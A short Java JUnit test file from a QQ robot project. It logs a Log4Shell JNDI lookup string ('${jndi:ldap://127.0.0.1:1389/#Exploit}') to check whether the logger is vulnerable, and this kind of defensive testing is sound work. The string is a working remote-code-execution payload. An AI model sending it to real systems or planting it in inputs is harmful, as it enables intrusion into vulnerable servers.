package cn.ultronxr.qqrobot;

import lombok.extern.slf4j.Slf4j;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;

/**
 * @author Ultronxr
 * @date 2022/02/03 19:31
 */
@Slf4j
@RunWith(SpringRunner.class)
@SpringBootTest
public class Log4jTest {

    @Test
    public void test(){
        log.error("123");
        log.error("${jndi:ldap://127.0.0.1:1389/#Exploit}");
        log.error("${}","jndi:ldap://127.0.0.1:1389/#Exploit");
    }

}
